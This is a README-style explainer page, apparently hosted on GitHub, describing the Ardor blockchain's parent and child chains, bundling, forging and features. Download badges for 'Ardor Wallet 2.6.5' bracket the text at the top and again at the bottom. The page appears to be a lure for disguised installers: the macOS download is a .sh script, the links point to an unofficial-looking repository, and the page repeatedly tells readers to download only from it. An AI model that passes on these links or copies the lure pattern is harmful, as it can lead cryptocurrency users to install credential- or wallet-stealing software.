![Ardor Wallet guide](assets/banner-article.png)

# What the Ardor blockchain is, how it works, and what else is called Ardor

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

Ardor is a proof-of-stake blockchain platform built around one parent chain and several child chains. The parent chain, secured by ARDR, carries the network's security and its forging; the child chains carry the tokens and features people actually use. One wallet opens all of them with one secret.

## The architecture in plain terms

Most platforms ask every application to justify its own chain, its own validators and its own security budget. Ardor inverts that. Security is concentrated on the parent chain, where forgers stake [ARDR](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-the-ardor-token-does.md), and applications run as child chains whose transactions are bundled onto the parent chain by bundlers.

| Layer | What it does | Token |
|---|---|---|
| Parent chain | Security, forging, the ledger that anchors everything | ARDR |
| Child chains | Applications and their own tokens: Ignis, the Nxt child chain, Bitswift, Triffic | Each chain's own token |
| Bundlers | Wrap child chain transactions into a parent chain transaction and pay the ARDR fee | Child chain fees in, ARDR out |

The result is that a user of a [child chain](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md) can transact without holding ARDR, because the bundler pays the parent chain fee on their behalf. That is a different model from a sidechain, where the user typically needs the parent chain's coin to move value across.

## How a transaction moves

A child chain transaction is created in the wallet, signed locally with the account's secret, and submitted to the child chain. A bundler picks it up, groups it with others, and pays ARDR to include the bundle on the parent chain. The child chain's own fee goes to the [Ardor bundler](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/how-ardor-bundling-works.md).

On the parent chain the path is shorter: the transaction is signed, the ARDR [fee](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/why-an-ardor-transaction-stays-unconfirmed.md) is paid directly, and a forger includes it in a block. Both paths end in the same place - an immutable record secured by the same set of forgers.

## Forging, not mining

Ardor has no miners and no proof-of-work race. Block generation is called forging, and it is open to any account holding enough ARDR with a node online. An account can also hand its forging weight to somebody else while keeping the coins under its own control.

Rewards are the transaction fees in the blocks a forger produces. There is no block subsidy, so there is no inflation schedule paying for security, and anyone quoting a staking yield is describing a different product. The economics are fee-based rather than issuance-based, which is why forging is best understood as transaction processing rather than as a savings product.

## What runs on it

The platform ships the features that usually require a separate application: a coin exchange for child chain tokens, an asset exchange for issued assets with royalties and dividends, a monetary system for custom currencies, a marketplace, voting with token-gated options, coin shuffling for privacy, phased and multisig transactions, atomic transaction chains, a data cloud with proof of existence, and lightweight contracts.

For a reader trying to place Ardor among other platforms, the distinguishing combination is the shared-security model plus those native features: an issued asset, a poll or a marketplace listing needs no contract deployment and no second token.

## Where the wallet fits

The wallet is the client for the whole platform rather than for one chain. It derives an account from a secret, shows the parent chain and every child chain beside it, and switches between them with a selector. Forging, leasing, both exchanges, the marketplace, voting and the data cloud are tabs in the same application, which is why the platform needs one install rather than one per chain.

That single-client design is also the reason the account is portable. Because the account comes from the secret rather than from a chain, the same secret reads the same address on every child chain, and installing on a second machine needs no transfer between them.

## Why the parent chain is quiet

Almost nothing a normal user does happens on the parent chain. Bundles arrive there, forgers order them, and the ledger records the result. The features themselves run on child chains, which keeps the secured ledger small and lets the feature chains change without touching the security layer.

That division is what makes a child chain transaction payable in a child chain token. The ARDR fee is still paid, by the bundler, so the network's security is funded without requiring every user to hold the parent chain asset. It is a different arrangement from a sidechain, where the user usually needs the parent coin to move value across.

## What else is called Ardor

The name collides with things that have nothing to do with the platform, and search results mix them freely.

- **Ardour** is a free audio workstation for recording and mixing. One letter apart, entirely different software.
- **Arder** is not a product name; queries spelling it that way usually mean Ardor.
- Retail and lifestyle results - bags, drinks, restaurant groups - appear for the bare word because the brand is also a common word in several languages.

If you arrived here looking for audio software, this is not it. If you arrived looking for a wallet, the platform described above is the one this site covers.

## FAQ

### Is Ardor a fork of Nxt?

It grew out of Nxt and shares its account model and much of its codebase, but it is a separate platform with a parent-and-child-chain architecture that Nxt did not have. Nxt now runs as a child chain of Ardor.

### Does Ardor use proof of work?

No. Block generation is proof-of-stake forging, and there is no mining.

### What is the difference between ARDR and Ignis?

ARDR is the parent chain token that secures the network and pays parent chain fees. Ignis is the first child chain's token, used for transactions and features on that child chain.

### Can I use Ardor without holding ARDR?

On a child chain, yes: a bundler pays the ARDR fee for your transaction. On the parent chain you need ARDR for the fee, and to forge you need a substantial balance.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [What the ARDR token is, what it pays for, and what its fixed supply means](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-the-ardor-token-does.md)
- [Ardor child chains explained, including one passphrase for all](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md)
- [What Ignis is on Ardor, and what the wallet does with it](https://github.com/ardor-software/ardor-platform-guides/blob/main/what-is-ignis-on-ardor.md)
- [How Ardor uses proof of stake, and its trade-offs](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/how-ardor-uses-proof-of-stake.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
